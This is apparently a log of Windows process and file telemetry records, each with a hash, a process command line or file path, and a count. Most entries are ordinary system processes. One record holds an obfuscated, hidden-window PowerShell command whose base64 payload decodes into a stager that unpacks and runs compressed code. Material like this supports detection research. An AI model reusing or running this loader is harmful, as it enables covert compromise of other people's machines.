8daa31fbb6dfc08603094fc71a423c8113047c6eba3cb7c1c056b60ab92558bf,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalServiceAndNoImpersonation'},473600
17301928827cf268975cac641c965557461e70b4d7a9ccb186f66d727b3d2324,{'subject': 'c:/windows/system32/windowspowershell/v1.0/powershell.exe C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEATQBVAEwAMQAyAEkAQwBBADcAVgBYAGIAWQAvAGEAUgAnACcAKwAnACcAaABEACcAJwArACcAJwArAFgAcQBuAC8AdwBZAHEAUQBNAEEAbwBIAE4AcgBpAFgAdQAwAGkAUgBhAHMAUAB4AEYAbQB4AGUALwBIAFoAQQBVAFcAWABzAHQAYgAzAEgAMgBrAHYAcwBOAFIAeABwACsAOQA4ADcAQwAvAGoAdQBvAGwAegBhAHQARgBJAHMAVwBhAHgAMwBaADIAWgBuAG4AMwBsAG0AWgB7ADEAfQBtAEwAMQBHAGUAWQBwAHsAMQB9AEkAZQBDAEgALwA4AC8ASgBOAHcAZQBhAFoAZQA1AGkAVwBDAFcAUABHAEwAcwBGADAAWABLAHIAdABzAHUAcAAzAFcAbgBwAGMAcgBPADYAcAAxAGgAQQArAEMAdQBGAEoAMwB1AHkANQBOAFAASgB5AHUAMwA3AC8AdgBGAEYAbQBHAFUAbgBiACsAYgB2AFEAUgBVAC8ATQBjAEoAUgB1AEMAVQBTADcAVwBoAEQAOABGAE4AMABZAFoAdQBwAHAAcwBIAHAARABQAGgARAArAEUAeQB1ACsATgBQAHEARQBiAGoAMQB6AEUAagBoADMAUABqADUARgB3AHAAYQBZAEIAWAB4AHQAVAAzACsATwBlAE4AYwB3AGQAdwBVAHkAcwAvAHYAWgBiAHQAYgBhADYAawB0AGUATgB1ADAAKwBGAFIAMwBLAHgAYQBoACcAJwArACcAJwA1AHoAaABwAEoARwBRAEUAaQAxAEoAdgB4AFYANAB4AHQAYQB4AHgAMABTAHEAegByADIATQA1AHIAVABrAEQAVgBjAG4ATABaACcAJwArACcAJwBiAEQAVAB2AE4AdgBSAEEAWgBZAEcAMgBQAGQATQBSAGkARwB1AFIAVgBPAE0AegB6AGMAVABMAEUAaQBpAHcAOQBuADQAcQBiAE8AUQB1AEoAVgBSAGgATwBNACsAcQByAFEAWgBDAGgAUABLAC8AVwBoAFIAWABmAFkATABWAGUALwB5AHEAdQBMAHIAdgBQAGkANQBUAGgAQgBEAFcARwBLAFUATQBaADMAWgBrAG8AMgAyAE0AZgA1AFkAMgBCAGwAdwBZAEUAegBWAEcANABCAGkAMgBUAFoAVABpAE4AMQByAFUAYQBpAE8AMwBwAEYAbwBtAFYAdABDAEMAawBMAHYAdwBYAE0ANgBLAEIARABpAFYAMgAzADYAcwBrAHYAbABRAEMAcQBTAG4ATABhAG4AVwBJADYAaQB2AG4AMQBHAGwAUQBFAEgAVABXAHIATAA3AGkANgBJAGsASgBOAFgAaQBlADIAQQBBAEkALwBzAFYAQgBEAEUAcwBHAEgAWgBlAHQAVgB5AGoAMABQAEYARQArAHEAOQBNAEsAQQBwAC8ARgBLAGMAMwB4AFMAZgBlAEQASQBOAFUARgBIAFgAYgAzAEcATQAyAE8AOABGAG0AeABzAHsAMQB9AEwAVgAxAGsAKwBJAEMANQBWAEEAQwB0AFAANgA5ADEAcQBUAFMAMQBXAHUAVwBBAFEAdwBzADMASQBvAEQAdABiAFAAKwBsADgAUQBvAEIASgB3AHAAWAA4AHsAMQB9AGMAeABlAEYATwBFAFgAZABZACsAbwBsADIAQwAvADUASwByADQAVwBFAHgAUQBTAGQATQBLAGoAVQBZAG8AWgA0AEoANQBZAHYAUwB5AHsAMQB9AG8ASQBzAEkAaQBqAHoARwBVAGUAYgBVACsARQByAHQATABzAEgAcwBTAFYAYwByAE0AQQBsAFEAcAB2AG8AUQAxAHgAeQA4AHsAMQB9AHAARABYAHYAbgBUAG0ASABEAGkAeAAnACcAKwAnACcATwBrAHgAMQBsAEEAJwAnACsAJwAnAEIAMgA1ADIALwB7ADEAfQBhAGkAVwBFAEwARQBHAGwAOQBDAFUAegBqAHUAWAB1AC8AQgB1AEUAcQBoADMAaQA1AFgAbABkAG0AQgBhAFEAcABuADUAZABNAEoARgBIAFUARgBBAFgAMQBEAFQASABsAHkAVwAxAFkAUABRADAAcgBEADYANwBxAHgAZQBFAFkAZAAvAEwAVwBXAGwAdQBYAGYAcwBDAHoATQB1AG0ASABaAHIAbQBMAEMAdAA4AGkAQwBrAEEAWQBKAGsANwA1AEcATwBQAGMARAB6AHEAdwB7ADEAfQBBAEgAUwBEAHUAYQBPAEMAbwAzAHIANwA2AEsAUgBzAGMAagBCAEgASQBIAEwATwAwAGgARwBqAEQARABVAFQAQQBaAFoAMABvAEcAZgBwADUAWQBVAFcAdQBZAGkAQQAyAFQASABVAEUASgB5AEoAeQBLAFIAbwA5ADQARQBaAFMASQBTADQAYQBjAHEATwBWAEYASwBLAGkAKwA2AG0AYQBaAEIAbQBmAE8AYwAxAFIASwBPAEYANAA0AEMAYQBFADIAQwAnACcAKwAnACcAVwBWADEAdwBjAEUAWgB7ADEAfQB3AEwARQBFAFEAWgBtAC8AUwA4AFgAdgBxADQAOAA0AEUAcwBuAFEANQBlADQAaQBHAFYAcQByAGIAUQBqADQAKwBTAHYASABNAEwAZgBIAHoAaABCAEwALwBpAGMAMABNAHsAMQB9AFkASQBOAEgATABhAEsASgA1AE8AYgBwAFcAegBqAFYARwBmAE4ATwBjADQASwBrAEsAegAyAEsAWQBFAGoAJwAnACsAJwAnADAAWQBiAGIARQA4AFAATQBDAHIAdwAyAHQAMwAzAHcAVQBmAFIANQBRAGQAUAAzAFkASABUAGQAMwB2ADUATgBOACsANwAwAGIARgBoACsAagB7ADEAfQAzAHgAaQBxAEgANAB3AEMAZABHACcAJwArACcAJwB1AEMAMwAnACcAKwAnACcATQB4AFIAVwBHAGUAcQBEAG0AWgBZADAAcABUAFkAMQB5AFEATAB4AHYAYQBRAEwAWQBiAHEAdwBNAEoAUwB0AEkAaAA5AEkAawAzAEIAaAByAG4ASQBKAFgAdwBZAHUATAByAGYAMQBUADQAZgBXAGoAbgBRAFYARgBFAEcAOQA1AEwAYQBiAGkAdQBUAHQAcgBRAEYAOABCAFoAWQBqAHIAWgBxAFkAQwBUADQAOABEAGkARwBNAFIAVABUAHkAVgB7ADEAfQBiADUAcABvADAASgBIAGUAagB6AG4AegBqAHQAJwAnACsAJwAnAG4AcABMAGwAdwB5AGEAUwBpADgATwBYAFoAcQBiADEANAB0AHUAcwA5AG0AOABEAGIAegArAEwAeQBSAFEATgBSAHEAMABTAE8ARQA1AGMAMgBvAE4ALwBFAFIAcgBOAGgAMAA5AFkASgBZACcAJwArACcAJwB0AEcANQBiADkATgB2ADcATQAnACcAKwAnACcAegAyAG0ANQB0ADkAZQBlACsANQB7ADEAfQB2AHoAQgB0ADUALwBLAEIARwBIADMAdgBCAGIAcABQAE0AOQAwAEYAYgBqAHkAdwB5AGkAMwBSAEwATABmAFIAdQBIAGoAbAB7ADEAfQB4ADMAaQBZAHYAUgBzAE8AbwBwAGIAUgAyAFUAYQB6AGUAKwAyAHcANgBUAHYAMwBTADMAYwAwADkAdQA1AG4AZQA4AFAAUwAyACsATQBIAHYAVABYAHMAeABHAE8AegBOAHoAZQBzAHoAaQBIAGEAOQBFAG0AMgBOAEwAWABCADAAagBXAHkAegBSAEYAMABXAHYARgB4ADAANQBMAEoAKwBQAE4AJwAnACsAJwAnAFcAewAxAH0AYgAwAEsAbwArAHYATABrADQANgBpADYASwBaAG0ATABkAHgAbAA3AEMAZgBiAEoAegB0AHEAUAA3AHAAMgAwAGkAUgB0ADMAagBxAFcAMwBhAEoAZAA4AEoAbQArAFAAWQBMAEQARQAzAHoARAAvAFIANgAzAFkAMgBPADUAbABSAFMAegBxADgAbQBMADEAbwAyADgAYQBNADkAegAvAGMARwBZAGIAZQB6AGwAWQB0AEUATwBaAHIANABwAE8ANQBQAGUAYQBMAHUAeABSAHAAYgA5ADAAQgB0AGIALwBlAFgARQAnACcAKwAnACcAZABPAFAASABoAGUAdQByAGQAagArACsAeAA4AHQAbQB2ADMAbgByAGoAaAA2AEoAUQBkAFgAdQBtAE0AWQA5AHcARQBRAE8ATABDAGQANQB5AEIAeABUAGUAUQBkAHIAcgBoAGYAdABRAG0AKwBvAEEAawA2AGQAawBkAEsAbgBkADMAYQBmAGgAawA0AFMAeQAvAFAAZABkAGYALwBrAEYAKwBEAG8ASgBCAEgAVAA0AHAAagBMADkAdwA0AEQAMgAvAGEARwBrAGEAVQBDADcAdgBPAHAASwBpAHYAVABwAG0ATwAxADcANAAzAHIATwB4ADgAOAAxAGoANwBOACsAcABGADYAQgB5AE0AUAAzAHAAbQBxAFcAVgA0AFAAYgArADIAMwA5ADAAMQA1AEMAWABzAHIAYQBlAHEAMABJAG4AVQBJAGEANwBhADgAcABIAGMANwBiADYAVABzACcAJwArACcAJwBtAHcANwBuAHoAMgBjAGwASAA2AGoAKwBCAE8AegBmAEUAMQBjADMAdwB1AHYAKwBuAHMAZAA0ADcANgBmAHoAWQA5AEMALwBLAHoAYQBKAEkANgBuAGoALwBZAEYANQBJAC8AQgBaAHMANQBxADMAOQBvAGMAMwBrAEEAUQByAEcANgBlAHMAMwBWAHAAWAA5AHEATgBQADIAJwAnACsAJwAnAFkAdwAzAGkAWgA5AC8AcQBoAEQALwBSAFMAWgA4AHEAdwBYAHEAWABwAGIAJwAnACsAJwAnAEgASABvAEUATQB7ADEAfQBkADUAVwBGAHEAawBlACcAJwArACcAJwB6AFgAcQBYAFoAagBXAGwAbQBHAHUASQBJAGwAeAA3AHQAaQBoAEwARQBZAEYANwBBACcAJwArACcAJwB0AHcAawB5AHUAeABXAEMAYQBFACsANwA1AFcAOABxAFUARwBiAFAAagBkAFAAMwBzAHYAdAA0AGMAbQBsADEAMABZADEANABVAG0AdwA5AHQAeABDAHkANgBuADMANwA1AGYAewAxAH0ASQB0AFEATABuAHMAeQBOAE0AJwAnACsAJwAnAFUAbwBqAEYAdABlAGwAeAA3AFkAawBRAGUAdQBUAEgAaQBYAGwAVgBCAGkAKwAvADIAQQBkAHUAagB1AEsASgAyAE4AMQAzAGoAdwBCAGwAOQBJADIATwBkAGsARwBjAHoAewAxAH0AVQBSAFAARgBIAFEAdwBVADMASgBBAGIARgArAHAAdAB7ADEAfQBmAFEAcwAzADIASAB7ADEAfQBMAHgAUgBWAHEALwBiAG4AbQBjAGYAUQAnACcAKwAnACcAMABTAHMAbABMADcARQA2AEgAZQBtAEwAQgBTACsAQQBBAE0AUgBsAE8AdgBlAEoAWABvAHoATQA5AHcATQBBAFYAKwBpAFIAVQBHAEwAOAA0AHYATAB5AEkAVgBJADUAcQA5AGkATQBwAGMAeQBuAGMATQBmAHcARQAvADAASwBaADUANwBsAC8AVwBQADAAdQBHAGsAbAAxAGoAcwAxAFgAawAxADkATwB2AE8AaAAyAFAAKwB6ADAAcgBvAGMAWgB5AEoAbgBRAGYAQQB7ADEAfQA2ADMANABWAGUAQgBlAEcAUwBJAGkAOQBpAEMAMgBFAEIALwBvAGUAWABoAC8AOQBCAG0AQgBUAHMAeQBvAEEATAA1ADYAbgA5AC8AUQAyAGgAZgAxAGYAeQBtAHsAMQB9AHcAQQBBAEEAewAwAH0AewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBnACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA'},470881
0b1f52205ced70b9fd84ef3ce24cbabcee37416aed61dddcdbc2f7fe81d930a1,{'file': 'c:/windows/system32/svchost.exe'},189794
11c68c80ab66e43acedd1f1583abfd105b1ea10d1a0c9ef43c301f668ab9bb74,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 14712960872013529032212180383310137508421618420066-249767920-2123542115-106330918'},470883
d31750b200247f2a170bf0b8a07b1300d42c2c2009e69816b5571e4e203c6757,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalServiceNoNetwork'},469860
017732516056685991472df328a2dff306787651d020db28eaca4623c4ecc760,{'subject': 'c:/windows/explorer.exe C:/Windows/Explorer.EXE'},469861
bc28b78f3af66755cfa7d129efa52ba56d780c43492f38816a3d982b421ec9a3,{'file': 'c:/program files/wireshark/dumpcap.exe'},1895
